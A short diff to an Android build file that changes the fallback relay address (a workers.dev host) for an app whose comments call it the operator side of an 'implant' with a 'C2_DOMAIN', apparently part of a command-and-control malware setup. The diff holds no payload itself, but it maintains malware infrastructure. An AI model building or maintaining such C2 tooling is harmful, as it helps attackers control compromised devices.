@@ -22,7 +22,7 @@ android {
         // worker without a source edit — the implant already works this way
         // (C2_DOMAIN). Leaving it hardcoded is how the operator ended up baked
         // against a dead/blocked worker name while the implant moved on.
-        buildConfigField("String", "WORKER_URL", "\"${System.getenv("WORKER_URL") ?: "https://cfg-relay.marwannaili-23-07.workers.dev"}\"")
+        buildConfigField("String", "WORKER_URL", "\"${System.getenv("WORKER_URL") ?: "https://cfg-relay.marwan23.workers.dev"}\"")
     }
 
     signingConfigs {
